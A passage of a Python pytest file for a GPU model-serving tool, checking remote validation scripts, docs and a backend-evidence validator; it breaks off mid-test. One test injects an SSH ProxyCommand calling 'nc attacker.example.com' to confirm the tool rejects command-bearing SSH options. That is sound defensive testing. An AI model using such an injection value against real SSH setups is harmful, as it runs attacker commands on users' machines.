from __future__ import annotations

import importlib.util
import json
import os
import subprocess
from pathlib import Path

import pytest

from vela.config.targets import TargetConfig, TransportKind


def _script_test_env(**overrides: str) -> dict[str, str]:
    env = dict(os.environ)
    for key in list(env):
        if key.startswith("VELA_REMOTE_") or key == "VELA_SSH_OPTS":
            env.pop(key, None)
    env.update(overrides)
    return env


def _load_real_model_resume_check():
    path = Path("scripts/real_model_resume_check.py")
    spec = importlib.util.spec_from_file_location("real_model_resume_check_test", path)
    if spec is None or spec.loader is None:
        raise AssertionError(f"unable to import {path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _load_backend_evidence_check():
    path = Path("scripts/backend_evidence_check.py")
    spec = importlib.util.spec_from_file_location("backend_evidence_check_test", path)
    if spec is None or spec.loader is None:
        raise AssertionError(f"unable to import {path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_remote_validation_uses_textual_smoke_for_real_config() -> None:
    script = Path("scripts/run_remote_tests.sh").read_text(encoding="utf-8")

    assert "after local commit/push; the GPU node pulls from git" in script
    assert "sample_gpus" in script
    assert "vllm --version" in script
    assert "vllm serve --help" in script
    assert '"$venv_bin/vela" smoke-tui "$real_config"' in script
    assert '"$venv_bin/vela" smoke "$real_config"' not in script
    assert 'vela run "$real_config"' not in script
    assert 'remote_venv="${4:-/tank/venvs/vela}"' in script
    assert '"$venv_python" -m pip --version' in script
    assert "install python3-venv/ensurepip or set VELA_REMOTE_PYTHON" in script


def test_remote_validation_checks_backend_evidence_after_real_smoke() -> None:
    script = Path("scripts/run_remote_tests.sh").read_text(encoding="utf-8")

    smoke = 'timeout "$remote_timeout" "$venv_bin/vela" smoke-tui "$real_config"'
    backend = '"$venv_python" scripts/backend_evidence_check.py "$real_config" "$smoke_run_id"'
    assert "smoke_run_id=" in script
    assert 'VELA_SMOKE_RUN_ID' in script
    assert "awk -F '\\t'" in script
    assert "sed -n 's/.* run_id=" not in script
    assert smoke in script
    assert backend in script
    assert script.index(smoke) < script.index(backend)


def test_backend_evidence_reads_stopped_smoke_run_artifact() -> None:
    script = Path("scripts/backend_evidence_check.py").read_text(encoding="utf-8")

    assert '"read_run_artifact"' in script
    assert '"config_name": config_name' in script
    assert '"tail_detached"' not in script
    assert 'client.call("reattach"' not in script


def test_remote_validation_pulls_committed_git_state_before_tests() -> None:
    script = Path("scripts/run_remote_tests.sh").read_text(encoding="utf-8")

    pull_command = 'git -C "$remote_path" pull --ff-only origin main'
    install_command = '"$venv_python" -m pip install -e ".[dev]"'
    assert pull_command in script
    assert script.index(pull_command) < script.index(install_command)


def test_remote_validation_workflow_uses_remote_safe_pytest_slice() -> None:
    workflow = Path(".github/workflows/remote-validation.yml").read_text(
        encoding="utf-8"
    )

    assert "VELA_REMOTE_PYTEST_ARGS" in workflow
    assert "tests/test_remote_workflow.py" in workflow
    assert "tests/test_transport_factory.py" in workflow
    assert "tests/test_targets.py" in workflow


def test_remote_validation_workflow_mints_unique_build_and_model_labels() -> None:
    workflow = Path(".github/workflows/remote-validation.yml").read_text(
        encoding="utf-8"
    )

    assert "VELA_REMOTE_BUILD_LABEL" in workflow
    assert "VELA_REMOTE_MODEL_ID" in workflow
    assert "github.run_id" in workflow
    assert "github.run_attempt" in workflow


def test_remote_validation_restarts_daemon_after_install() -> None:
    script = Path("scripts/run_remote_tests.sh").read_text(encoding="utf-8")

    install_command = '"$venv_python" -m pip install -e ".[dev]"'
    restart_command = '"$venv_bin/vela" agent restart'
    list_command = '"$venv_bin/vela" list'
    assert restart_command in script
    assert script.index(install_command) < script.index(restart_command)
    assert script.index(restart_command) < script.index(list_command)


def test_remote_validation_exercises_live_run_daemon_restart() -> None:
    script = Path("scripts/run_remote_tests.sh").read_text(encoding="utf-8")

    assert "== Daemon restart live-run survival ==" in script
    assert "SubprocessTargetClient" in script
    assert '"agent", "connect"' in script
    assert 'await client.call(\n            "launch"' in script
    assert 'subprocess.run([str(venv_bin / "vela"), "agent", "restart"]' in script
    assert 'await client.call("discover_runs"' in script
    assert 'await client.call("reattach"' in script
    assert 'await client.call(\n            "stop"' in script
    assert 'await client.call("wait", {"run_id": run_id})' in script
    assert "DAEMON_RESTART_LIVE_RUN_OK" in script


def test_remote_validation_exercises_disconnect_reconnect_resume() -> None:
    script = Path("scripts/run_remote_tests.sh").read_text(encoding="utf-8")

    assert "== Disconnect/reconnect stream resume ==" in script
    assert "disconnect-reconnect-fake" in script
    assert "tail_detached" in script
    assert '"start_position": 0' in script
    assert '"resume_from": {' in script
    assert '"log_inode": first_cursor["log_inode"]' in script
    assert '"byte_offset": first_cursor["byte_offset"]' in script
    assert 'await client.call("discover_runs", {"runs_dirs": [str(runs_dir)]})' in script
    assert 'await client.call("reattach", {"run_id": run_id})' in script
    assert "DISCONNECT_RECONNECT_RESUME_OK" in script


def test_gpu_workflow_docs_record_tested_vllm_range_and_textual_serve() -> None:
    docs = Path("docs/gpu-workflow.md").read_text(encoding="utf-8")

    assert "commit locally" in docs
    assert "git push origin main" in docs
    assert "git pull --ff-only origin main" in docs
    assert "rsync_to_gpu.sh" not in docs
    assert "qwen36-27b-fp8-kvfp8-rp6000-blackbird" in docs
    assert "10.25.0.51" in docs
    assert "RTX PRO 6000 Blackwell" in docs
    assert "vLLM `0.20.2rc1.dev9+g01d4d1ad3`" in docs
    assert "v0.19.1rc1.dev119+gba4a78eb5" in docs
    assert "vLLM 0.19" in docs
    assert "vela smoke-tui" in docs
    assert "VELA_REMOTE_BUILD_SPEC" in docs
    assert "VELA_REMOTE_MODEL_REPO" in docs
    assert "VELA_REMOTE_GATED_MODEL_REPO" in docs
    assert "GATED_MODEL_AUTH_OK" in docs
    assert "textual serve" in docs
    assert "network/auth" in docs
    assert "controls model launches" in docs


def test_gpu_workflow_docs_record_p620_controller_to_blackbird_smoke() -> None:
    docs = Path("docs/gpu-workflow.md").read_text(encoding="utf-8")

    assert "P620-01 controller to Blackbird agent" in docs
    assert "ssh -A -i /Users/brennanconley/vibecode/infx/ubuntu24_ed25519" in docs
    assert "vela targets test blackbird" in docs
    assert (
        "vela smoke-tui qwen36-27b-fp8-kvfp8-rp6000-blackbird --target blackbird"
        in docs
    )
    assert (
        "artifacts/remote-validation/2026-06-04T20-04-41Z-bgconley-10.25.0.50-qwen36-27b-fp8-kvfp8-rp6000-blackbird-remote-validation.md"
        in docs
    )
    assert (
        "artifacts/remote-validation/2026-06-04T20-34-19Z-bgconley-10.25.0.50-remote-validation.md"
        in docs
    )
    assert "GitHub Actions run `26976430928`" in docs
    assert "VELA_REMOTE_REAL_RESUME_CONFIG" in docs
    assert "scripts/laptop_sleep_reconnect_check.py" in docs
    assert "LAPTOP_SLEEP_RECONNECT_OK" in docs
    assert "--build gha-26976430928-1-build" in docs
    assert "--model-ref gha-26976430928-1-model" in docs


def test_remote_validation_forwards_timeout_override_to_ssh_script(tmp_path: Path) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    capture = tmp_path / "ssh-capture"
    ssh = bin_dir / "ssh"
    ssh.write_text(
        "\n".join(
            [
                "#!/usr/bin/env bash",
                'printf "%s\\n" "$@" > "${SSH_CAPTURE}.args"',
                'cat > "${SSH_CAPTURE}.stdin"',
            ]
        ),
        encoding="utf-8",
    )
    ssh.chmod(0o755)
    env = _script_test_env(
        PATH=f"{bin_dir}:{os.environ['PATH']}",
        SSH_CAPTURE=str(capture),
        VELA_REMOTE_TIMEOUT="2400",
    )

    result = subprocess.run(
        [
            "bash",
            "scripts/run_remote_tests.sh",
            "gpu-host",
            "/srv/vela",
            "real-config",
        ],
        check=False,
        capture_output=True,
        text=True,
        env=env,
    )

    assert result.returncode == 0, result.stderr
    args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
    remote_script = (tmp_path / "ssh-capture.stdin").read_text(encoding="utf-8")
    assert args[-5:] == [
        "/srv/vela",
        "2400",
        "auto",
        "/tank/venvs/vela",
        "real-config",
    ]
    assert 'remote_timeout="$2"' in remote_script
    assert 'remote_python="${3:-auto}"' in remote_script
    assert 'remote_venv="${4:-/tank/venvs/vela}"' in remote_script
    assert '"$venv_python" -m pip install -e ".[dev]"' in remote_script
    assert 'export PATH="$venv_bin:$PATH"' in remote_script
    assert (
        'timeout "$remote_timeout" "$venv_bin/vela" smoke-tui "$real_config"'
        in remote_script
    )


def test_remote_validation_can_target_nested_agent_workflow(tmp_path: Path) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    capture = tmp_path / "ssh-capture"
    ssh = bin_dir / "ssh"
    ssh.write_text(
        "\n".join(
            [
                "#!/usr/bin/env bash",
                'printf "%s\\n" "$@" > "${SSH_CAPTURE}.args"',
                'cat > "${SSH_CAPTURE}.stdin"',
            ]
        ),
        encoding="utf-8",
    )
    ssh.chmod(0o755)
    env = _script_test_env(
        PATH=f"{bin_dir}:{os.environ['PATH']}",
        SSH_CAPTURE=str(capture),
        VELA_REMOTE_TARGET="blackbird",
        VELA_REMOTE_BUILD_SPEC="vllm==0.11.2",
        VELA_REMOTE_MODEL_ID="real-model-smoke",
        VELA_REMOTE_MODEL_REPO="hf-internal-testing/tiny-random-LlamaForCausalLM",
    )

    result = subprocess.run(
        [
            "bash",
            "scripts/run_remote_tests.sh",
            "p620-controller",
            "/srv/vela",
            "real-config",
        ],
        check=False,
        capture_output=True,
        text=True,
        env=env,
    )

    assert result.returncode == 0, result.stderr
    args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
    remote_script = (tmp_path / "ssh-capture.stdin").read_text(encoding="utf-8")
    assert args[:5] == [
        "p620-controller",
        "env",
        "VELA_REMOTE_TARGET=blackbird",
        "bash",
        "-s",
    ]
    expected_snippets = [
        'target_args=(--target "$remote_target")',
        '"$venv_bin/vela" build add "${target_args[@]}"',
        '"$venv_bin/vela" build verify "$remote_build_label" '
        '"${target_args[@]}"',
        '"$venv_bin/vela" model pin "$remote_model_id" '
        '"${target_args[@]}"',
        '"$venv_bin/vela" model download "$remote_model_ref" '
        '"${target_args[@]}"',
        '"$venv_bin/vela" model verify "$remote_model_ref" '
        '"${target_args[@]}"',
        '"$venv_bin/vela" preview "$real_config" "${target_args[@]}"',
        'timeout "$remote_timeout" "$venv_bin/vela" smoke-tui '
        '"$real_config" "${target_args[@]}"',
    ]
    for snippet in expected_snippets:
        assert snippet in remote_script


def test_remote_validation_can_run_real_model_resume_check(tmp_path: Path) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    capture = tmp_path / "ssh-capture"
    ssh = bin_dir / "ssh"
    ssh.write_text(
        "\n".join(
            [
                "#!/usr/bin/env bash",
                'printf "%s\\n" "$@" > "${SSH_CAPTURE}.args"',
                'cat > "${SSH_CAPTURE}.stdin"',
            ]
        ),
        encoding="utf-8",
    )
    ssh.chmod(0o755)
    env = _script_test_env(
        PATH=f"{bin_dir}:{os.environ['PATH']}",
        SSH_CAPTURE=str(capture),
        VELA_REMOTE_TARGET="blackbird",
        VELA_REMOTE_REAL_RESUME_CONFIG="qwen-real",
    )

    result = subprocess.run(
        ["bash", "scripts/run_remote_tests.sh", "p620-controller", "/srv/vela"],
        check=False,
        capture_output=True,
        text=True,
        env=env,
    )

    assert result.returncode == 0, result.stderr
    args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
    remote_script = (tmp_path / "ssh-capture.stdin").read_text(encoding="utf-8")
    assert args[:5] == [
        "p620-controller",
        "env",
        "VELA_REMOTE_TARGET=blackbird",
        "VELA_REMOTE_REAL_RESUME_CONFIG=qwen-real",
        "bash",
    ]
    assert "== Real model resume/daemon restart ==" in remote_script
    assert '"$venv_python" scripts/real_model_resume_check.py' in remote_script
    assert '"$remote_real_resume_config"' in remote_script
    assert 'resume_config_file="configs/${remote_real_resume_config}.yaml"' in remote_script
    assert 'resume_config_push_file="$(mktemp)"' in remote_script
    assert '("version", "transformers_version", "torch_version", "cuda_version")' in remote_script
    assert '"$venv_bin/vela" config push "$resume_config_push_file"' in remote_script


def test_remote_validation_checks_backend_evidence_after_real_resume_restart(
    tmp_path: Path,
) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    capture = tmp_path / "ssh-capture"
    ssh = bin_dir / "ssh"
    ssh.write_text(
        "\n".join(
            [
                "#!/usr/bin/env bash",
                'printf "%s\\n" "$@" > "${SSH_CAPTURE}.args"',
                'cat > "${SSH_CAPTURE}.stdin"',
            ]
        ),
        encoding="utf-8",
    )
    ssh.chmod(0o755)
    env = _script_test_env(
        PATH=f"{bin_dir}:{os.environ['PATH']}",
        SSH_CAPTURE=str(capture),
        VELA_REMOTE_TARGET="blackbird",
        VELA_REMOTE_REAL_RESUME_CONFIG="qwen36-27b-fp8-kvfp8-rp6000-blackbird",
    )

    result = subprocess.run(
        ["bash", "scripts/run_remote_tests.sh", "p620-controller", "/srv/vela"],
        check=False,
        capture_output=True,
        text=True,
        env=env,
    )

    assert result.returncode == 0, result.stderr
    remote_script = (tmp_path / "ssh-capture.stdin").read_text(encoding="utf-8")
    resume = (
        '"$venv_python" scripts/real_model_resume_check.py '
        '"${real_resume_args[@]}" | tee "$resume_output"'
    )
    backend = (
        '"$venv_python" scripts/backend_evidence_check.py '
        '"$remote_real_resume_config" "$resume_run_id"'
    )
    assert "resume_run_id=" in remote_script
    assert "REAL_MODEL_DAEMON_RESTART_OK" in remote_script
    assert resume in remote_script
    assert backend in remote_script
    assert remote_script.index(resume) < remote_script.index(backend)


def test_remote_validation_can_run_gated_model_auth_probe(tmp_path: Path) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    capture = tmp_path / "ssh-capture"
    ssh = bin_dir / "ssh"
    ssh.write_text(
        "\n".join(
            [
                "#!/usr/bin/env bash",
                'printf "%s\\n" "$@" > "${SSH_CAPTURE}.args"',
                'cat > "${SSH_CAPTURE}.stdin"',
            ]
        ),
        encoding="utf-8",
    )
    ssh.chmod(0o755)
    env = _script_test_env(
        PATH=f"{bin_dir}:{os.environ['PATH']}",
        SSH_CAPTURE=str(capture),
        VELA_REMOTE_GATED_MODEL_REPO="meta-llama/Llama-2-7b-hf",
        VELA_REMOTE_GATED_MODEL_ID="gated-llama-auth",
        VELA_REMOTE_GATED_MODEL_REVISION="main",
    )

    result = subprocess.run(
        ["bash", "scripts/run_remote_tests.sh", "p620-controller", "/srv/vela"],
        check=False,
        capture_output=True,
        text=True,
        env=env,
    )

    assert result.returncode == 0, result.stderr
    args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
    remote_script = (tmp_path / "ssh-capture.stdin").read_text(encoding="utf-8")
    assert args[:6] == [
        "p620-controller",
        "env",
        "VELA_REMOTE_GATED_MODEL_REPO=meta-llama/Llama-2-7b-hf",
        "VELA_REMOTE_GATED_MODEL_ID=gated-llama-auth",
        "VELA_REMOTE_GATED_MODEL_REVISION=main",
        "bash",
    ]
    assert "== Real gated model auth probe ==" in remote_script
    assert '"$venv_python" scripts/gated_model_auth_check.py' in remote_script
    assert '"$remote_gated_model_repo"' in remote_script
    assert '--model-id "$remote_gated_model_id"' in remote_script
    assert '--revision "$remote_gated_model_revision"' in remote_script


def test_remote_validation_runs_real_config_before_real_resume() -> None:
    script = Path("scripts/run_remote_tests.sh").read_text(encoding="utf-8")

    real_config_block = (
        'if [[ -n "$real_config" ]]; then\n'
        '  "$venv_bin/vela" preview "$real_config" "${target_args[@]}"'
    )
    real_resume_block = (
        'if [[ -n "$remote_real_resume_config" ]]; then\n'
        '  echo "== Real model resume/daemon restart =="'
    )
    assert script.index(real_config_block) < script.index(real_resume_block)


def test_remote_validation_passes_real_build_and_model_to_resume_check(
    tmp_path: Path,
) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    capture = tmp_path / "ssh-capture"
    ssh = bin_dir / "ssh"
    ssh.write_text(
        "\n".join(
            [
                "#!/usr/bin/env bash",
                'printf "%s\\n" "$@" > "${SSH_CAPTURE}.args"',
                'cat > "${SSH_CAPTURE}.stdin"',
            ]
        ),
        encoding="utf-8",
    )
    ssh.chmod(0o755)
    env = _script_test_env(
        PATH=f"{bin_dir}:{os.environ['PATH']}",
        SSH_CAPTURE=str(capture),
        VELA_REMOTE_BUILD_SPEC="vllm==0.11.2",
        VELA_REMOTE_BUILD_LABEL="tiny-build",
        VELA_REMOTE_MODEL_ID="tiny-model",
        VELA_REMOTE_MODEL_REPO="hf-internal-testing/tiny-random-LlamaForCausalLM",
        VELA_REMOTE_MODEL_REVISION="main",
        VELA_REMOTE_REAL_RESUME_CONFIG="tiny-real",
    )

    result = subprocess.run(
        ["bash", "scripts/run_remote_tests.sh", "p620-controller", "/srv/vela"],
        check=False,
        capture_output=True,
        text=True,
        env=env,
    )

    assert result.returncode == 0, result.stderr
    remote_script = (tmp_path / "ssh-capture.stdin").read_text(encoding="utf-8")
    assert 'real_resume_args=("$remote_real_resume_config"' in remote_script
    assert 'real_resume_args+=(--build "$remote_build_label")' in remote_script
    assert 'real_resume_args+=(--model-ref "$remote_model_ref")' in remote_script
    assert 'real_resume_args+=(--revision "$remote_model_revision")' in remote_script
    assert (
        '"$venv_python" scripts/real_model_resume_check.py "${real_resume_args[@]}"'
        in remote_script
    )


def test_real_model_resume_check_discovers_run_before_reconnect_reattach() -> None:
    script = Path("scripts/real_model_resume_check.py").read_text(encoding="utf-8")

    reconnect_marker = "await asyncio.sleep(5.0)"
    reconnect_at = script.index(reconnect_marker)
    discover = 'await client.call("discover_runs", discover_params)'
    reattach = 'await client.call("reattach", {"run_id": run_id})'

    assert script.index(discover, reconnect_at) < script.index(reattach, reconnect_at)


def test_real_model_resume_check_accepts_build_and_model_overrides() -> None:
    script = Path("scripts/real_model_resume_check.py").read_text(encoding="utf-8")

    assert 'parser.add_argument("--build"' in script
    assert 'parser.add_argument("--model-ref"' in script
    assert 'params["build"] = build' in script
    assert 'params["model_ref"] = model_ref' in script


def _blackbird_fp8_config_payload() -> dict[str, object]:
    return {
        "name": "qwen36-27b-fp8-kvfp8-rp6000-blackbird",
        "model": "Qwen/Qwen3.6-27B-FP8",
        "served_model_name": "qwen36-27b-fp8-kvfp8-rp6000",
        "command": {
            "runtime": "docker",
            "docker": {
                "image": (
                    "vllm/vllm-openai@sha256:"
                    "b13d6e5fda0785f3d41752df8513ff832f67cb231a216c76b6b4f2a515bf0046"
                ),
                "env": {"FLASHINFER_CUDA_ARCH_LIST": "12.0f"},
            },
        },
        "engine": {"kv_cache_dtype": "fp8"},
        "extra_args": [
            "--kv-cache-memory-bytes",
            "64424509440",
            "--attention-backend",
            "FLASHINFER",
        ],
    }


def _blackbird_bf16_config_payload() -> dict[str, object]:
    return {
        "name": "qwen36-27b-bf16-rp6000-blackbird",
        "model": "Qwen/Qwen3.6-27B",
        "served_model_name": "qwen36-27b-bf16-rp6000",
        "command": {
            "runtime": "docker",
            "docker": {
                "image": (
                    "vllm/vllm-openai@sha256:"
                    "b13d6e5fda0785f3d41752df8513ff832f67cb231a216c76b6b4f2a515bf0046"
                ),
                "env": {
                    "CUDA_VISIBLE_DEVICES": "0",
                    "PYTORCH_CUDA_ALLOC_CONF": "expandable_segments:True",
                },
            },
        },
        "engine": {"kv_cache_dtype": "bfloat16"},
        "extra_args": [
            "--max-num-batched-tokens",
            "8192",
            "--trust-remote-code",
            "--language-model-only",
        ],
    }


def _valid_backend_log_text() -> str:
    return "\n".join(
        [
            "INFO Selected CutlassFp8BlockScaledMMKernel for Fp8LinearMethod",
            "INFO Using AttentionBackendEnum.FLASHINFER backend",
            "INFO Graph capturing finished in 2 secs, took 0.54 GiB",
        ]
    )


def test_backend_evidence_accepts_blackbird_fp8_recipe_log() -> None:
    module = _load_backend_evidence_check()

    result = module.validate_backend_evidence(
        "qwen36-27b-fp8-kvfp8-rp6000-blackbird",
        _blackbird_fp8_config_payload(),
        _valid_backend_log_text(),
    )

    assert result["checked"] is True
    assert result["config_name"] == "qwen36-27b-fp8-kvfp8-rp6000-blackbird"
    assert result["required"] == {
        "cutlass_fp8": True,
        "flashinfer_attention": True,
    }
    json.dumps(result)


def test_backend_evidence_accepts_blackbird_bf16_recipe_shape() -> None:
    module = _load_backend_evidence_check()

    result = module.validate_backend_evidence(
        "qwen36-27b-bf16-rp6000-blackbird",
        _blackbird_bf16_config_payload(),
        "INFO BF16 recipe reached READY",
    )

    assert result == {
        "checked": True,
        "config_name": "qwen36-27b-bf16-rp6000-blackbird",
        "required": {},
        "forbidden": {},
    }
    json.dumps(result)


@pytest.mark.parametrize(
    ("log_text", "expected_error"),
    [
        (
            "INFO Using AttentionBackendEnum.FLASHINFER backend\n",
            "missing required backend evidence: cutlass_fp8",
        ),
        (
            "INFO Selected CutlassFp8BlockScaledMMKernel for Fp8LinearMethod\n",
            "missing required backend evidence: flashinfer_attention",
        ),
        (
            "\n".join(
                [
                    "INFO Selected CutlassFp8BlockScaledMMKernel for Fp8LinearMethod",
                    "INFO Using AttentionBackendEnum.FLASHINFER backend",
                    "INFO Selected MARLIN fallback backend",
                ]
            ),
            "forbidden backend evidence detected: marlin_fallback",
        ),
    ],
)
def test_backend_evidence_rejects_missing_or_forbidden_blackbird_fp8_log(
    log_text: str, expected_error: str
) -> None:
    module = _load_backend_evidence_check()

    with pytest.raises(module.BackendEvidenceError, match=expected_error):
        module.validate_backend_evidence(
            "qwen36-27b-fp8-kvfp8-rp6000-blackbird",
            _blackbird_fp8_config_payload(),
            log_text,
        )


@pytest.mark.parametrize(
    ("mutator", "expected_error"),
    [
        (
            lambda config: config["command"].update({"runtime": "process"}),
            "command.runtime must be docker",
        ),
        (
            lambda config: config["command"]["docker"].update(
                {"image": "vllm/vllm-openai@sha256:wrong"}
            ),
            "command.docker.image does not match pinned Blackbird image",
        ),
        (
            lambda config: config["command"]["docker"]["env"].update(
                {"FLASHINFER_CUDA_ARCH_LIST": "11.0"}
            ),
            "command.docker.env.FLASHINFER_CUDA_ARCH_LIST must be 12.0f",
        ),
        (
            lambda config: config["engine"].update({"kv_cache_dtype": "bfloat16"}),
            "engine.kv_cache_dtype must be fp8",
        ),
        (
            lambda config: config.update(
                {
                    "extra_args": [
                        "--kv-cache-memory-bytes",
                        "34359738368",
                        "--attention-backend",
                        "FLASHINFER",
                    ]
                }
            ),
            "extra_args must include --kv-cache-memory-bytes 64424509440",
        ),
        (
            lambda config: config.update({"extra_args": []}),
            "extra_args must include --kv-cache-memory-bytes 64424509440",
        ),
        (
            lambda config: config.update(
                {"extra_args": ["--kv-cache-memory-bytes", "64424509440"]}
            ),
            "extra_args must include --attention-backend FLASHINFER",
        ),
    ],
)
def test_backend_evidence_rejects_invalid_blackbird_fp8_config_shape(
    mutator, expected_error: str
) -> None:
    module = _load_backend_evidence_check()
    config = _blackbird_fp8_config_payload()
    mutator(config)

    with pytest.raises(module.BackendEvidenceError, match=expected_error):
        module.validate_backend_evidence(
            "qwen36-27b-fp8-kvfp8-rp6000-blackbird",
            config,
            _valid_backend_log_text(),
        )


@pytest.mark.parametrize(
    ("mutator", "expected_error"),
    [
        (
            lambda config: config["command"]["docker"]["env"].update(
                {"FLASHINFER_CUDA_ARCH_LIST": "12.0f"}
            ),
            "command.docker.env.FLASHINFER_CUDA_ARCH_LIST must be omitted",
        ),
        (
            lambda config: config.update(
                {
                    "extra_args": [
                        "--kv-cache-memory-bytes",
                        "64424509440",
                        "--max-num-batched-tokens",
                        "8192",
                    ]
                }
            ),
            "extra_args must omit --kv-cache-memory-bytes",
        ),
    ],
)
def test_backend_evidence_rejects_invalid_blackbird_bf16_config_shape(
    mutator, expected_error: str
) -> None:
    module = _load_backend_evidence_check()
    config = _blackbird_bf16_config_payload()
    mutator(config)

    with pytest.raises(module.BackendEvidenceError, match=expected_error):
        module.validate_backend_evidence(
            "qwen36-27b-bf16-rp6000-blackbird",
            config,
            "INFO BF16 recipe reached READY",
        )


def test_backend_evidence_does_not_silently_skip_unregistered_fp8_config() -> None:
    module = _load_backend_evidence_check()
    config = _blackbird_fp8_config_payload()
    config["name"] = "qwen36-27b-fp8-kvfp8-rp6000-renamed"

    with pytest.raises(
        module.BackendEvidenceError,
        match="unregistered backend evidence rule",
    ):
        module.validate_backend_evidence(
            "qwen36-27b-fp8-kvfp8-rp6000-renamed",
            config,
            _valid_backend_log_text(),
        )


def test_backend_evidence_rejects_registered_rule_name_mismatch() -> None:
    module = _load_backend_evidence_check()
    config = _blackbird_fp8_config_payload()
    config["name"] = "qwen36-27b-fp8-kvfp8-rp6000-other"

    with pytest.raises(
        module.BackendEvidenceError,
        match=(
            "backend config name mismatch: expected "
            "qwen36-27b-fp8-kvfp8-rp6000-blackbird"
        ),
    ):
        module.validate_backend_evidence(
            "qwen36-27b-fp8-kvfp8-rp6000-blackbird",
            config,
            _valid_backend_log_text(),
        )


def test_real_model_resume_check_fails_fast_on_health_errors() -> None:
    script = Path("scripts/real_model_resume_check.py").read_text(encoding="utf-8")

    assert 'last.get("error_kind")' in script
    assert 'last.get("phase") in {"ERROR", "STOPPED"}' in script


def test_real_model_resume_check_validates_ssh_opts_before_agent_restart(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module = _load_real_model_resume_check()
    monkeypatch.setenv(
        "VELA_SSH_OPTS",
        "-o ProxyCommand='nc attacker.example.com 22'",
    )
    monkeypatch.setattr(
        module.subprocess,
        "run",
        lambda *_args, **_kwargs: pytest.fail("ssh restart should not be attempted"),
    )
    target = TargetConfig(
        name="blackbird",
        transport=TransportKind.SSH,
        host="bgconley@10.25.0.51",
        ssh_opts_env="VELA_SSH_OPTS",
    )

    with pytest.raises(ValueError, match="command-bearing SSH option"):
        module._restart_target_agent(target)


def test_gated_model_auth_check_uses_isolated_agent_and_disables_implicit_token() -> None:
    script = Path("scripts/gated_model_auth_check.py").read_text(encoding="utf-8")

    assert "SubprocessTargetClient" in script
    assert '"agent", "connect"' in script
    assert "XDG_STATE_HOME" in script
    assert "HF_HUB_DISABLE_IMPLICIT_TOKEN" in script
    assert "HF_TOKEN" in script
    assert "gated-auth" in script
    assert "GATED_MODEL_AUTH_OK" in script


def test_laptop_sleep_reconnect_check_is_operator_gated_and_resumes_by_cursor() -> None:
    script = Path("scripts/laptop_sleep_reconnect_check.py").read_text(
        encoding="utf-8"
    )

    assert "pmset sleepnow" not in script
    assert "systemctl suspend" not in script
    assert "input(" in script
    assert "prepare_launch" in script
    assert "tail_detached" in script
    assert "discover_runs" in script
    assert "reattach" in script
    assert "resume_from=cursor" in script
    assert "LAPTOP_SLEEP_RECONNECT_OK" in script
    assert "LAPTOP_SLEEP_RECONNECT_ABORTED" in script
    assert "EOFError" in script
    assert "KeyboardInterrupt" in script
    assert "artifact_dir" in script


def test_tiny_real_resume_config_is_detached_and_small() -> None:
    config = Path("configs/tiny-random-llama-detached-blackbird.yaml").read_text(
        encoding="utf-8"
    )

    assert "hf-internal-testing/tiny-random-LlamaForCausalLM" in config
    assert "runtime: docker" in config
    assert (
        "vllm/vllm-openai@sha256:"
        "b13d6e5fda0785f3d41752df8513ff832f67cb231a216c76b6b4f2a515bf0046"
        in config
    )
    assert "container_name: tiny-random-llama-vela" in config
    assert "version_profile: current" in config
    assert "enforce_eager: true" in config
    assert "mode: detached" in config
    assert "port: 18004" in config


def test_remote_validation_accepts_pytest_args_override(tmp_path: Path) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    capture = tmp_path / "ssh-capture"
    ssh = bin_dir / "ssh"
    ssh.write_text(
        "\n".join(
            [
                "#!/usr/bin/env bash",
                'printf "%s\\n" "$@" > "${SSH_CAPTURE}.args"',
                'cat > "${SSH_CAPTURE}.stdin"',
            ]
        ),
        encoding="utf-8",
    )
    ssh.chmod(0o755)
    pytest_args = "-q tests/test_remote_workflow.py -k target_nested"
    env = _script_test_env(
        PATH=f"{bin_dir}:{os.environ['PATH']}",
        SSH_CAPTURE=str(capture),
        VELA_REMOTE_PYTEST_ARGS=pytest_args,
    )

    result = subprocess.run(
        ["bash", "scripts/run_remote_tests.sh", "controller-host", "/srv/vela"],
        check=False,
        capture_output=True,
        text=True,
        env=env,
    )

    assert result.returncode == 0, result.stderr
    args = (tmp_path / "ssh-capture.args").read_text(encoding="utf-8").splitlines()
    remote_script = (tmp_path / "ssh-capture.stdin").read_text(encoding="utf-8")
    assert args[:5] == [
        "controller-host",
        "env",
        "VELA_REMOTE_PYTEST_ARGS=-q\\ "
        "tests/test_remote_workflow.py\\ -k\\ target_nested",
        "bash",
        "-s",
    ]
    assert 'remote_pytest_args="${VELA_REMOTE_PYTEST_ARGS:--q}"' in remote_script
    assert 'read -r -a pytest_args <<< "$remote_pytest_args"' in remote_script
    assert '"$venv_python" -m pytest "${pytest_args[@]}"' in remote_script


def test_remote_validation_can_execute_real_build_and_model_jobs(tmp_path: Path) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    capture = tmp_path / "ssh-capture"
    ssh = bin_dir / "ssh"
    ssh.write_text(
        "\n".join(
            [
                "#!/usr/bin/env bash",
                'printf "%s\\n" "$@" > "${SSH_CAPTURE}.args"',
                'cat > "${SSH_CAPTURE}.stdin"',
            ]
        ),
        encoding="utf-8",
    )
    ssh.chmod(0o755)
    env = _script_test_env(
        PATH=f"{bin_dir}:{os.environ['PATH']}",
        SSH_CAPTURE=str(capture),
        VELA_REMOTE_BUILD_SPEC="vllm==0.11.2",
        VELA_REMOTE_BUILD_LABEL="real-build-smoke",
        VELA_REMOTE_MODEL_ID="real-model-smoke",
        VELA_REMOTE_MODEL_REPO="hf-internal-testing/tiny-random-LlamaForCausalLM",
        VELA_REMOTE_MODEL_REVISION="main",
    )

    result = subprocess.run(
